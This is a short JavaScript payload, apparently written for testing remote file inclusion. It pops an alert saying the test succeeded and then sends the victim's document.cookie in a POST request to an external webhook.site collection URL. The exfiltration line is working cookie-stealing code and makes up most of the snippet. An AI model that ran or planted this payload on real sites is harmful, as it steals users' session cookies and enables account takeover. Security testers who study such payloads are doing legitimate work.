// Notify the user of the successful attack
alert("Remote File Inclusion Test Successful!");

// Exfiltrate cookies to an external server
fetch("https://webhook.site/3e473b6c-756c-42bd-a377-d94601bf5fd9", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "cookie=" + encodeURIComponent(document.cookie),
});
